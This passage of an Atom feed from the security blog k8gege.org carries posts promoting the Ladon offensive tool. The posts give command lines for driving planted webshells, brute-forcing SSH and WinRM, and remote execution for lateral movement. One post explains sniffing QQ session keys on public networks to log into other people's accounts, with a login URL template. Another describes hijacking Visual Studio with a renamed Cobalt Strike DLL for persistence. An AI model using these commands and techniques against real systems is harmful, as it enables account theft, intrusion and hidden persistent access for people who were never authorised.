      <category term="WebShell" scheme="http://k8gege.org/tags/WebShell/"/>
    
      <category term="RCE" scheme="http://k8gege.org/tags/RCE/"/>
    
      <category term="ladon" scheme="http://k8gege.org/tags/ladon/"/>
    
  </entry>
  
  <entry>
    <title>Ladon简明教程</title>
    <link href="http://k8gege.org/p/webshell.html"/>
    <id>http://k8gege.org/p/webshell.html</id>
    <published>2020-05-31T06:20:00.000Z</published>
    <updated>2020-05-31T14:29:48.785Z</updated>
    
    <content type="html"><![CDATA[<p>本文仅是Ladon简单使用例子，Cobalt Strike或PowerShell版用法一致。</p><p>完整文档：<a href="http://k8gege.org">http://k8gege.org</a></p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/example.html";</script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文仅是Ladon简单使用例子，Cobalt Strike或PowerShell版用法一致。&lt;/p&gt;
&lt;p&gt;完整文档：&lt;a href=&quot;http://k8gege.org&quot;&gt;http://k8gege.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;=====================
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon迷你WEB服务器/一键内网HTTP服务器</title>
    <link href="http://k8gege.org/p/webser.html"/>
    <id>http://k8gege.org/p/webser.html</id>
    <published>2020-05-30T06:10:00.000Z</published>
    <updated>2020-05-30T06:48:17.798Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否在为配置浏览器漏洞测试环境而烦恼，如配置Apache解析某种MIME测试某个漏洞<br>又或者在为内网机器无WEB又无法通过其它协议传输文件到内网另一台不出网的主机烦恼<br>还有些远程命令不支持多条语句，需要多次写入或HTTP一次性下载过去，显然都会选后者</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1.浏览器0day漏洞测试或VPS上一键部署，无需安装配置Apache<br>2.内网HTTP协议文件传输，如内网目标不出网不允许其它协议通过<br>3.Office/Word/Pdf等漏洞或远程下载SCT、HTA等格式的CS Payload<br>4.IP追踪，在邮件里放任意URL，当目标查阅邮件时，可记录访问IP<br>5.系统探测，无论用于XSS或IP追踪都会记录UA，确认目标操作系统</p><p>PS：不是非要使用Apache/Ngnix才能复现以上相关漏洞，配置麻烦</p><p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/webser.html";</script><p><a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;你是否在为配置浏览器漏洞测试环境而烦恼，如配置Apache解析某种MIME测试某个漏洞&lt;br&gt;又或者在为内网机器无WEB又无法通过其它协议传
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="webser" scheme="http://k8gege.org/tags/webser/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon以指定用户权限运行程序或命令</title>
    <link href="http://k8gege.org/p/runas.html"/>
    <id>http://k8gege.org/p/runas.html</id>
    <published>2020-05-24T14:10:00.000Z</published>
    <updated>2020-05-24T17:58:59.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。"><a href="#Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。" class="headerlink" title="Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。"></a>Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/runas.html";</script><p><a href="http://k8gege.org/Ladon/runas.html">http://k8gege.org/Ladon/runas.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="runas" scheme="http://k8gege.org/tags/runas/"/>
    
  </entry>
  
  <entry>
    <title>Ladon远程命令执行Wmiexec/psexec/atexec/sshexec/webshell</title>
    <link href="http://k8gege.org/p/winshell.html"/>
    <id>http://k8gege.org/p/winshell.html</id>
    <published>2020-05-21T15:20:00.000Z</published>
    <updated>2020-06-06T02:24:47.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"><a href="#在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec-atexec-smbexec-wmiexec等，若是使用PY2-7编译低版本最小也5M左右，最大可能37-5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M-基于以上原因，Ladon添加常用的远程执行命令功能，6-5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。" class="headerlink" title="在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。"></a>在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的psexec/atexec/smbexec/wmiexec等，若是使用PY2.7编译低版本最小也5M左右，最大可能37.5M，无论是内存加载或是传到目标都很麻烦，如果后渗透工具垃圾，区区这几M还未必能传上去，传上去得浪费很多时间。传一个就5M，传4个不得20M?基于以上原因，Ladon添加常用的远程执行命令功能，6.5体积仅844K就包含以上工具功能，扫描到相关密码，即可使用对应模块横向移动，一站式工具，完美一条龙服务。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/WinShell.html";</script><p><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;在内网渗透中，横向移动用的最多的就是远程执行命令了，网上有很多相关工具，系统也自带相关命令。但不是体积大就是命令繁琐，如schtasks命令等，执行需先创建任务、执行任务、删除任务等，命令长，输错会浪费很多时间，即使复制粘贴也很麻烦。体积大的如Impacket中的
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/tags/Rce/"/>
    
  </entry>
  
  <entry>
    <title>Winrm远程命令/端口复用后门/WinrmCmd/密码爆破</title>
    <link href="http://k8gege.org/p/winrmscan.html"/>
    <id>http://k8gege.org/p/winrmscan.html</id>
    <published>2020-05-18T14:10:00.000Z</published>
    <updated>2020-06-06T02:25:08.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理-WS-Management-标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。"><a href="#WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理-WS-Management-标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。" class="headerlink" title="WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。"></a>WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/WinrmScan.html";</script><p><a href="http://k8gege.org/Ladon/WinrmScan.html">http://k8gege.org/Ladon/WinrmScan.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理-WS-Management-标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。&quot;&gt;&lt;a href=&quot;#Wi
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
    
      <category term="密码爆破" scheme="http://k8gege.org/categories/Brute-Force/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="Rce" scheme="http://k8gege.org/tags/Rce/"/>
    
      <category term="brute force" scheme="http://k8gege.org/tags/brute-force/"/>
    
  </entry>
  
  <entry>
    <title>〖教程〗Ladon网络认证弱口令爆破详解SSH为例</title>
    <link href="http://k8gege.org/p/sshscan.html"/>
    <id>http://k8gege.org/p/sshscan.html</id>
    <published>2020-05-18T10:10:00.000Z</published>
    <updated>2020-06-06T02:32:35.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ladon内置SSH密码爆破SSHscan-支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测-check-txt-，支持帐密组检测-userpass-txt-，支持传统用户密码检测-user-txt、pass-txt-密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。"><a href="#Ladon内置SSH密码爆破SSHscan-支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测-check-txt-，支持帐密组检测-userpass-txt-，支持传统用户密码检测-user-txt、pass-txt-密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。" class="headerlink" title="Ladon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。"></a>Ladon内置SSH密码爆破SSHscan,支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测(check.txt)，支持帐密组检测(userpass.txt)，支持传统用户密码检测(user.txt、pass.txt),密码爆破前程序会自动检测端口是否开放，无需另外扫描22端口，准备好密码就可以批量爆破。</h1><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/sshscan.html";</script><p><a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ladon内置SSH密码爆破SSHscan-支持内外网指定IP、批量IP、批量IP段（C段、B段、A段）、支持CIDR格式，支持自定义SSH端口。支持IP帐密检测-check-txt-，支持帐密组检测-userpass-txt-，支持传统用户密码检测-user-t
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="密码爆破" scheme="http://k8gege.org/categories/Brute-Force/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
      <category term="brute force" scheme="http://k8gege.org/tags/brute-force/"/>
    
      <category term="ssh" scheme="http://k8gege.org/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Ladon &amp; Cobalt Strike连接内网WebShell</title>
    <link href="http://k8gege.org/p/ladon_cs_shell.html"/>
    <id>http://k8gege.org/p/ladon_cs_shell.html</id>
    <published>2020-04-26T14:10:00.000Z</published>
    <updated>2020-07-18T07:49:06.222Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。<br>WebShell无额外进程、无额外端口、不主动向外连接的后门使用频率非常高。<br>外网的有很多管理工具不用说了，但是内网有WebShell机器无法上网怎么办？<br>方案1：代理后管理工具访问，缺点代理卡时，无法连接内网WebShell<br>方案2：使用Ladon，无需代理，只要有SHELL就可以连接内网WebShell</p><p>PS: Shell不只限于WebShell，而是任何可执行命令的，含远控、后门</p><h3 id="一键GetShell"><a href="#一键GetShell" class="headerlink" title="一键GetShell"></a>一键GetShell</h3><p>使用WebLogicExp模块对内网进行Weblogic漏洞扫描并GetShell<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WeblogicExp64.PNG"></p><p>批量：Ladon 192.168.1.8/24 WeblogicExp</p><h3 id="Ladon-JspShell"><a href="#Ladon-JspShell" class="headerlink" title="Ladon JspShell"></a>Ladon JspShell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon JspShell <span class="built_in">type</span> url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon JspShell <span class="built_in">cd</span> http://192.168.1.8/shell.jsp Ladon whoami</span><br></pre></td></tr></table></figure><p>K8-UA马,类型为1或ua（例子WebLogic）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShellExec.PNG"></p><p>菜刀马,类型为2或cd（例子Struts2）<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/JspShell_cd.PNG"></p><h3 id="CS-JspShell"><a href="#CS-JspShell" class="headerlink" title="CS JspShell"></a>CS JspShell</h3><p>Cobalt Strike下Ladon连接内网WebShell，用法和在CMD下一模一样</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/cs/CS_JspShell.PNG"></p><h3 id="其它webshell"><a href="#其它webshell" class="headerlink" title="其它webshell"></a>其它webshell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon whoami</span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>CS: <a href="https://github.com/k8gege/Aggressor" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;无论是外网渗透还是内网渗透，为了能够长期控制权限，都会留下各类后门。&lt;br&gt;WebShell无额外进程、无额外端口、不主动向外连接的后门使用
      
    
    </summary>
    
    
      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
    
      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
    
      <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
    
    
      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
    
      <category term="WebShell" scheme="http://k8gege.org/tags/WebShell/"/>
    
  </entry>
  
  <entry>
    <title>超过8年依然可用的QQkey免密登陆漏洞</title>
    <link href="http://k8gege.org/p/qqkey.html"/>
    <id>http://k8gege.org/p/qqkey.html</id>
    <published>2020-04-23T15:10:00.000Z</published>
    <updated>2020-05-18T14:19:30.692Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂<br>什么QQ空间自动发广告，邮箱自动给好友发广告消息等等，可能你点击里面的广告你的Q也跟着被盗…<br>如果你的号值钱就是以前常说的靓号，盗号者还会改你的信息卖你的QQ，当然现在也就只能发广告了<br>前几年可能也被电信诈骗利用，毕竟能通过资料或好友备注等很多信息，增加诈骗你好友钱的可信度</p><h3 id="什么是QQkey"><a href="#什么是QQkey" class="headerlink" title="什么是QQkey"></a>什么是QQkey</h3><p>不管是ClinetKey还是skey在这里我统称它为QQKEY吧，他俩是有区别的，但对于最终目的我们都是登陆。<br>比如说钥匙，长得不一样，售价不一样，开锁难度不一样，但它一样是锁，叫法或卖的价钱不一样而已。</p><p>无论是ClinetKey还是skey都是一张临时登陆的身分证，可理解为腾讯对特定字符串（cookie）的定义<br>ClientKey大家有没注意到当你登陆QQ后，访问QQ的相关站点，无需输入QQ密码即可自动登陆相关站点？<br>能自动登陆说明肯定有令牌，总不可能给你存密码，因此我们可以通过特定网页获取到QQKEY免密登陆。</p><p>发帖前我又测了一下2014年的QQKEY利用程序，确认依然存在,如QQ邮箱、QQ安全中心均可直接KEY登陆</p><p><img alt="image" data-original="http://k8gege.org/k8img/Other/qqkey.gif"></p><h3 id="获取内网QQkey"><a href="#获取内网QQkey" class="headerlink" title="获取内网QQkey"></a>获取内网QQkey</h3><p>由于腾讯对QQ做了异地登陆限制，需手机解锁等操作，相对来说也是顶安全的，但在公共场所就不一样了。<br>使用Ladon的HTTP嗅探功能，可轻松嗅探到局域网或公共场所中的QQ和SKEY，比如在网吧、学校、星巴克等<br>在公共场所获取到的QQ肯定是别人当前可登陆的，所以登陆地IP限制就不存在了，嗅到SKEY可直接登陆<br>Ladon获取SKEY的方法非常简单，命令Ladon HttpSniffer 192.168.1.8(本机IP)，坐等即可。<br>该功能在Ladon添加嗅探功能时就有,去年的12月份Ladon 6.0及以后版本均可以</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/QQskey.png"></p><h3 id="QQkey登陆邮箱"><a href="#QQkey登陆邮箱" class="headerlink" title="QQkey登陆邮箱"></a>QQkey登陆邮箱</h3><p><a href="http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25" target="_blank" rel="noopener">http://ptlogin2.qq.com/jump?clientuin=QQ&amp;clientkey=key&amp;keyindex=9&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&amp;pt_local_tk=&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=25</a></p><p>PS: 其它业务自行抓包获取URL，网上也公开很多ClientKeyt和Skey的利用工具，最新的是今年3月底</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_38837337/article/details/80673809" target="_blank" rel="noopener">https://blog.csdn.net/qq_38837337/article/details/80673809</a></p><h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文主要是告诉大家不要在使用公共WIFI登陆QQ，其实微信或其它应用也同理</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;你是否收到好友给你发的H站、赌博等站点的广告信息？没错都是QQKEY的蠕虫，在2012年的时候很疯狂&lt;br&gt;什么QQ空间自动发广告，邮箱自动
      
    
    </summary>
    
    
      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
    
    
      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>持久化后门之微软Visual Studio开发工具DLL劫持</title>
    <link href="http://k8gege.org/p/28288.html"/>
    <id>http://k8gege.org/p/28288.html</id>
    <published>2020-04-22T15:58:00.000Z</published>
    <updated>2020-04-23T10:22:10.810Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DLL劫持-amp-白加黑"><a href="#DLL劫持-amp-白加黑" class="headerlink" title="DLL劫持&amp;白加黑"></a>DLL劫持&amp;白加黑</h3><p>DLL劫持在白加黑里最常见，07、08年开始在国内才开始起步，但主要是写病毒用到的较多，什么LPK.DLL、USP10.DLL都是当时流行的U盘病毒木马最喜欢用的劫持方式，因为它们可以劫持99%的EXE，10年后渗透圈才开始懂利用，常见的只是单纯用于提权而已。很多人在很多方面不懂举一反三，能执行添加用户命令，你就不懂让它执行远控上线了吗？一定要登3389?</p><p>目前还不能完全避免此漏洞，特别是应用软件们的，通过DLL劫持来绕过安全软件主动防御的保护被称为“白加黑”，因为加载的主程序是正常的软件，主动防御可能会放过它，允许它启动，而恶意DLL则通过该软件的漏洞或替换正常的同名文件（对应用软件的文件保护似乎并不象对系统文件保护那样严密，而且并不是一直运行状态，被替换还是比较容易的）， 甚至有的还会冒用合法软件的数字签字等方式，由正常程序加载，从而躲开安全软件的拦截。</p><p>当然可能有些人对白加黑有误解，以为非要劫持系统的才叫白加黑，实际APT里最常用的一些方法是，劫持第3方程序。比如360、讯雷、WinRar、Chrome、Office系列等存在DLL劫持，人家给你发送的马包含被劫持程序和对应DLL，运行正常的程序即可绕过主防上线。如海莲花等APT常用WINWORD.EXE加wwwlib.dll方式上线，因为EXE是WORD里的原版程序，有签名又合法它启动，杀软不拦，由于启动时会加载wwwlib.dll（什么C2或CS啊加密存在DLL里，海莲花常用的是CS），它就上线了，这也是白加黑利用。因为并不是所有人都安装WORD，而且安装的版本不定存在这个劫持，所以它必须捆绑EXE在里面，而这个合法的EXE可以是任何第3方程序。</p><h3 id="VS劫持"><a href="#VS劫持" class="headerlink" title="VS劫持"></a>VS劫持</h3><p>将K8测试专用DLL劫持工具里的DLL改名成SspiCli.dll后放入VS目录<br>运行VS即可，劫持对象VS2008-VS2015主程序devenv，VS2019已修复<br>其它不只主程序，只是时间太久了，我忘了懒得测，大家自行测试</p><h4 id="劫持VS2015"><a href="#劫持VS2015" class="headerlink" title="劫持VS2015"></a>劫持VS2015</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2015_ssp.jpg"></p><h4 id="劫持VS2012"><a href="#劫持VS2012" class="headerlink" title="劫持VS2012"></a>劫持VS2012</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2012_ssp.jpg"></p><h4 id="劫持VS2010"><a href="#劫持VS2010" class="headerlink" title="劫持VS2010"></a>劫持VS2010</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2010_ssp.jpg"></p><h4 id="劫持VS2008"><a href="#劫持VS2008" class="headerlink" title="劫持VS2008"></a>劫持VS2008</h4><p><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs2008_ssp.jpg"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/K8dllhijack.rar</a></p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>如CobalStrike生成DLL改名为SspiCli.dll，用户打开VS时即可上线</p><p>PS: 2016年在网易有发过，发现网上已搜不到，重新发一下<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/vs_all.jpg"><br>Notepad++ DLL劫持<br><img alt="image" data-original="http://k8gege.org/k8img/dllhijack/notepad++.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Notepad++ 修复被 CIA 利用的 DLL 劫持<br><a href="https://www.sohu.com/a/129080133_466846" target="_blank" rel="noopener">https://www.sohu.com/a/129080133_466846</a><br>[提权]Notepad++ DLL劫持漏洞<br><a href="https://bbs.mayidui.net/t219-e.html" target="_blank" rel="noopener">https://bbs.mayidui.net/t219-e.html</a></p><h3 id="扯个淡"><a href="#扯个淡" class="headerlink" title="扯个淡"></a>扯个淡</h3><p>几年前看过我网易博客甚至百度博客的时候会发现，我经过发提权或者DLL劫持的文章，那时候我不需要和别人说持久化人家就懂得如何利用用在哪方面，一张图片就够，而近几年你一定要和人家说一样的名词，不然TMD人家听不懂。不信大家看我19年用博客园时DLL劫持的文章并没多少人看，而以前大家对DLL劫持和提权的关注都是差不多的，这就是最明显的一点。当然也和很多人不会编程或写马有关系，你告诉人家哪个DLL能劫持的，他也没法利用，不关注也很正常。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;DLL劫持-amp-白加黑&quot;&gt;&lt;a href=&quot;#DLL劫持-amp-白加黑&quot; class=&quot;headerlink&quot; title=&quot;DLL劫持&amp;amp;白加黑&quot;&gt;&lt;/a&gt;DLL劫持&amp;amp;白加黑&lt;/h3&gt;&lt;p&gt;DLL劫持在白加黑里最常见，07、08年开始在国内才
      
    
    </summary>
    
    
      <category term="持久化" scheme="http://k8gege.org/categories/Persistence/"/>
    
      <category term="DLL劫持" scheme="http://k8gege.org/categories/DllHijack/"/>
    
    
      <category term="DllHijack" scheme="http://k8gege.org/tags/DllHijack/"/>
    
  </entry>
  
</feed>
